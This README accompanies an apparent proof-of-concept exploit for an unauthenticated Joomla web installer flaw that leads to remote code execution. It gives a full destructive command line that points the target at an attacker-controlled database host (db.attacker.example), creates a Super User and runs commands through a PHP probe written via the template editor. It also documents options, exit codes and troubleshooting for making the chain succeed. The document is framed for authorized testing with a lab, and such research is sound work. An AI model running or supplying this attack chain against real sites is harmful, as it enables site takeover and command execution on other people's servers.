# CVE-2026-123214 — Joomla! web installer authentication bypass

PoC for **CVE-2026-123214**: on an installed Joomla site, the web installer
remains usable while `installation/` exists. An unauthenticated attacker can
drive the installer's JSON tasks to rewrite `configuration.php`, point the site
at a database they control, and create a Super User. This PoC then removes
`installation/`, logs in, and writes a PHP probe through the template editor to
demonstrate command execution.

| | |
|---|---|
| CVE | [CVE-2026-123214](https://www.cve.org/CVERecord?id=CVE-2026-123214) |
| Advisory | [Joomla JSST 20261111](https://developer.joomla.org/security-centre/1109-20261111-core-missing-authentication-in-web-installer.html) |
| Affected | Joomla! CMS 4.0.0–5.4.10, 6.0.0–6.2.0 |
| Fixed | 5.4.11, 6.2.1 |
| Class | CWE-306, CVSS 4.0 9.2 (Critical) |

> **Authorized testing only.** Use against systems you own or have explicit
> written permission to test.

## Contents

- `exploit/poc_unauth_rce.py` — standalone remote exploit
- `lab/` — disposable Docker lab and [testing guide](lab/README.md)
- `requirements.txt` — Python dependency
- `.gitignore`

## Requirements

- Python 3.10+
- `requests` (`python3 -m pip install -r requirements.txt`)
- Docker + Docker Compose for the lab

## Usage

### State check (non-destructive)

```bash
python3 exploit/poc_unauth_rce.py https://target.example --check
```

Only GET requests. Reports the fingerprintable Joomla version, whether the
installer is present and renders the `remove` view (the vulnerable state), and
where `/administrator` redirects. Versions outside the affected range are
reported as not vulnerable even if the remove view still renders.
Exit `0` = vulnerable, `2` = not vulnerable.

### Full chain (destructive)

```bash
python3 exploit/poc_unauth_rce.py https://target.example --exploit \
  --db db.attacker.example:3306 \
  --db-user pwn --db-pass 'db-password' --db-name pwn \
  --admin-user attacker --admin-pass 'AttackerPass123!' \
  --cmd id --yes
```

The database must be reachable **from the target**, and the credentials must
allow creating/populating one schema. The installer creates the schema.

| Option | Meaning |
|---|---|
| `--db HOST[:PORT]` | Attacker MySQL/MariaDB as reachable from the target |
| `--db-user/-pass/-name/-prefix` | Schema credentials |
| `--admin-user/-pass` | Super User to create |
| `--cmd` | Command executed through the probe (default `id`) |
| `--proxy`, `--timeout`, `--no-verify` | Network/TLS controls |
| `--admin-path PATH` | Administrator path (default `/administrator`) |
| `--verbose` | Print raw installer/admin responses |
| `--restore FILE` | Restore a saved template source, then exit |
| `--force` | Skip the vulnerable-state gate |
| `--yes` | Confirm destructive mode non-interactively |

Exit codes: `0` success, `1` error, `2` not vulnerable, `3` remote DB host
refused, `4` configuration not writable, `5` login failed, `6` RCE marker not
returned.

### Troubleshooting

| Exit | Likely cause | What to check |
|---|---|---|
| `2` | Installer absent, site not installed, or fixed version | `--check` output; version line |
| `3` | Remote DB host refused | `JOOMLA_INSTALLATION_DISABLE_LOCALHOST_CHECK`, marker file |
| `4` | `configuration.php` not writable | File ownership/permissions |
| `5` | Admin login failed | `--admin-path`, created credentials, config rewrite |
| `6` | Probe did not fire | Page cache, template write, PHP `disable_functions` |
| `1` | Network/JSON/unexpected error | Rerun with `--verbose` |

## Lab

```bash
bash lab/run_local_poc.sh
```

Builds the vulnerable state on loopback and runs the exploit end-to-end. See
[lab/README.md](lab/README.md) for details and manual steps.

## Notes

- Validated end-to-end on Joomla **6.2.0**. Version **6.2.1** is fixed and was
  tested independently; **5.4.11** is the fixed 5.x release per the advisory.
- The target must accept a non-local DB host. Joomla's `checkRemoteDbHost()`
  refuses one unless `JOOMLA_INSTALLATION_DISABLE_LOCALHOST_CHECK=1` is set
  (the official Docker image sets it) or the marker-file proof is satisfied.
  The exploit detects this and exits `3`.
- If the front end has page caching enabled, the probe may not fire until the
  cache is cleared. The trigger sends a unique query string and no-cache
  headers, but server-side cache plugins can still interfere.
- `--exploit` overwrites `configuration.php` and removes `installation/`. It is
  destructive.
- Credits: Dhairya Shukla, Cấn Quang Hiếu, Vedant Shinde, Adham Mohammed Abd
  Al-Kawi and Tilaksingh Rana.
